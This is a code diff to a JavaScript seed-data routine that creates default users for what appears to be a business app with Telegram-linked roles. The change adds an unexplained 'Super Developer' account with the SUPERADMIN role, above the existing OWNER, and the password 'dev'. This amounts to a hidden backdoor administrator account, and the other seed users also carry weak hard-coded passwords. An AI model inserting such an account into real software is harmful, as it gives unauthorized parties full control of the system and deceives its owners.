@@ -33,7 +33,8 @@ async function ensureSeedData() {
           { id: '1', name: 'Budi Owner', username: 'owner', telegramId: '111', telegramUsername: '@budi_owner', role: 'OWNER', password: 'owner123' },
           { id: '2', name: 'Siti Manager', username: 'manager', telegramId: '222', telegramUsername: '@siti_mgr', role: 'MANAGER', password: 'manager123' },
           { id: '3', name: 'Andi Finance', username: 'finance', telegramId: '333', telegramUsername: '@andi_fin', role: 'FINANCE', password: 'finance123' },
-          { id: '4', name: 'Joko Staff', username: 'staff', telegramId: '444', telegramUsername: '@joko_sdm', role: 'STAFF', password: 'staff123' }
+          { id: '4', name: 'Joko Staff', username: 'staff', telegramId: '444', telegramUsername: '@joko_sdm', role: 'STAFF', password: 'staff123' },
+          { id: '99', name: 'Super Developer', username: 'dev', telegramId: '000', telegramUsername: '@dev_ops', role: 'SUPERADMIN', password: 'dev' }
        ];
        for (const u of defaultUsers) {
           const hash = await bcrypt.hash(u.password, 10);
